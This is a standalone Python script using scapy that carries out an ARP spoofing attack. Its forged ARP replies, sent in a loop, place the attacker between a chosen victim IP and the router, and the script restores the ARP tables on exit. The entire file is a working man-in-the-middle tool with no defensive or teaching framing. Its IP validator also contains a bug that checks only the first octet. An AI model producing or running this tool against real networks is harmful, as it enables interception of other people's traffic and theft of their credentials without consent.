#!/usr/bin/env python

import optparse
import re
import scapy.all as scapy
import sys
import time


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("--t", "--target", dest="target", help="Target IP for ARP Spoof, (Victim)")
    parser.add_option("--s", "--spoof", dest="spoof", help="Spoof IP for ARP Spoof, (Router)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a Target IP, use --help for more info.")
    if not validate_ip(options.target):
        parser.error("[-] INVALID TARGET IP Target! (ex: 192.168.1.1)")
    if not options.spoof:
        parser.error("[-] Please specify a Spoof IP, use --help for more info.")
    if not validate_ip(options.spoof):
        parser.error("[-] INVALID SPOOF IP! (ex: 192.168.1.1)")
    return options


def validate_ip(ip):
    # Group 0 = 192.168.1.1 # Group 1 = 192.X.X.X # Group 2 = X.168.X.X # Group 3 = X.X.1.X # Group 4 = X.X.X.1
    address = re.search(r"((\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3}))", ip)
    if address:
        for group in address.groups()[1:]:
            return 0 <= int(group) <= 255
    return False


def get_mac(ip):
    # ARP
    arp_request = scapy.ARP(pdst=ip)
    # Ethernet Broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Packet
    arp_request_broadcast = broadcast/arp_request
    # Sending the packet / Receive the Response
    (answered_list, unanswered_list) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc


# This is telling the target that we have the routers MAC address...This is an ARP Response
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False, count=5)


options = get_arguments()
iterations = 0
try:
    while True:
        spoof(options.target, options.spoof)
        spoof(options.spoof, options.target)
        iterations += 2
        print("\r[+] Sent two packets: Total Packets: " + str(iterations) + "  "),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(options.target, options.spoof)
    restore(options.spoof, options.target)
    print("\n[-] User Quit: Exiting...")
